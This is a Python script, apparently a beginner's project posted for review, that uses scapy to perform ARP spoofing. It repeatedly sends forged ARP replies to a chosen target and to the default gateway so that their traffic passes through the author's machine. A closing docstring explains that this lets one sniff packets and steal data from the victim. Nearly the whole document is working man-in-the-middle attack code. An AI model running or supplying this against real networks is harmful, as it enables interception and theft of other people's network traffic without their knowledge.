import scapy.all as scapy
import time
from getmac import get_mac_address as gma
import netifaces

target_ip = "the computer you want to spoof"

gws = netifaces.gateways()
gateway_ip = gws['default'][netifaces.AF_INET][0]  # get the gateway's ip automatically

my_mac_address = gma()  # "get my MAC address automatically"

# clock
TIME_TO_WAIT = 2  # seconds


#  pdst - where the ARP packet should go - IP
#  psrc - is the IP to update in the target's arp table - IP
#  hwdst - is the destination hardware address - MAC
#  hwsrc - is the MAC corresponding to psrc, to update in the target's arp table
#  dst - destination(MAC address)

def get_mac_address(ip):  # The function returns us the MAC address of our desired IP address
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    # answered_list can be divided to : answer, unanswered  |||  answered_list[0] = answered, answered_list[1] = unanswered
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    """the purpose of the function is to "lie" about my address
     and change the target's ARP table on the current IP to my MAC address """
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac_address(target_ip), psrc=spoof_ip, hwsrc=my_mac_address)

    scapy.send(packet, verbose=True)


def restore(destination_ip, source_ip):
    """"""
    destination_mac = get_mac_address(destination_ip)
    source_mac = get_mac_address(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)

    scapy.send(packet, verbose=False)


def main():
    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            print("{0} Packets Sent".format(str(sent_packets_count)))
            time.sleep(TIME_TO_WAIT)  # Waits for two seconds
    except KeyboardInterrupt:
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("\nCtrl + C pressed.............Exiting")


if __name__ == "__main__":
    main()

"""This project is one of my firsts when I start coding, I would be grateful to get some comments and a review about it.
for those who don't know what arp spoofer is:
arp spoofer is in general, a method of spoofing your router on your local network and pretend of being a different machine and getting all of its information that comes from outer networks from the router, the specific computer at the same time thinks you are the router. meanwhile, both the router and the device aren't aware of the spoofing. In order not to make the machine suspect you, of course, you pass all the data to it eventually as it thinks your computer is the router, your computer is sort of a bridge between the two. subsequently, you can sniff packets, and steal data from the machine.
If I did not explain myself well enough here is a link to a website that explains it quite clearly.
https://www.veracode.com/security/arp-spoofing

In my project I decided to use the scapy library in python."""
